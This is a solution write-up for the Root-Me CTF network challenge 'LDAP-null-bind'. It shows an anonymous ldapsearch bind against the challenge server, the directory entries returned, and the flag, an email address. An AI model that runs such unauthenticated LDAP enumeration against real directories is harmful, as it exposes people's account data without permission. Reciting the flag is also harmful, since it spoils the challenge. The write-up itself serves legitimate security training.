---
title: "LDAP-null-bind"
ctf: "Root-Me"
category: "network"
difficulty: "easy"
points: 15
techniques: ["ldap"]
tools: []
keywords: ["LDAP-null-bind", "Root-Me", "network", "ldap"]
status: "solved"
has_script: false
source: "Root-Me/Network/LDAP-null-bind/note.md"
---

# LDAP-null-bind (Root-Me, network)

## Summary
Challenge **LDAP-null-bind** from the Root-Me CTF, network category. Main technique: ldap. ❯❯ ldapsearch -H ldap://challenge01.root-me.org:54013 -x -b "ou=anonymous, dc=challenge01, dc=root-me, dc=org" # # dn: ou=anonymous, dc=challenge01, dc=root-me, dc=org objectClass:OrganizationalUnit ou: anonymous dn: uid=sabu, ou=anonymous, dc=challenge01, dc=root-me, dc=org objectClass: inetOrgPerson objectClass: shadowAccount uid: sabu sn: sabu cn: sabu givenName: sabu mail: sabu@anonops.org search: 2 result: 0 Success

## Statement and artefacts

**Official statement (Root-Me, English page):**

It seems that one of the anonymous created a new branch in the LDAP directory, somewhere in:

```text
dc=challenge01,dc=root-me,dc=org
```

Get access to its data and get his email adress.

**Challenge connection information:**
- Host: `challenge01.root-me.org`
- Protocol: `TCP`
- Port: `54013`

- **Category:** Network
- **Difficulty:** Easy
- **Points:** 15
- **Author(s):** g0uZ
- **Published:** 2013-05-26 17:06:38
- **Root-Me page:** https://www.root-me.org/en/Challenges/Network/LDAP-null-bind

**Provided files / artifacts:** none; this is a remote LDAP service.

## Recognition signals
Not specified.

## Resolution method
```bash
1. ❯❯ ldapsearch -H ldap://challenge01.root-me.org:54013 -x -b "ou=anonymous, dc=challenge01, dc=root-me, dc=org"


# LDAPv3
# base <ou=anonymous, dc=challenge01, dc=root-me, dc=org> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# anonymous, challenge01.root-me.org dn: ou=anonymous, dc=challenge01, dc=root-me, dc=org objectClass: organizationalUnit ou: anonymous

# sabu, anonymous, challenge01.root-me.org dn: uid=sabu, ou=anonymous, dc=challenge01, dc=root-me, dc=org objectClass: inetOrgPerson objectClass: shadowAccount uid: sabu sn: sabu cn: sabu givenName: sabu mail: sabu@anonops.org

# search result search: 2 result: 0 Success

#numResponses: 3
# numEntries: 2
```
## Flag
sabu@anonops.org

## Lessons and reusable patterns
- Main technique: ldap.
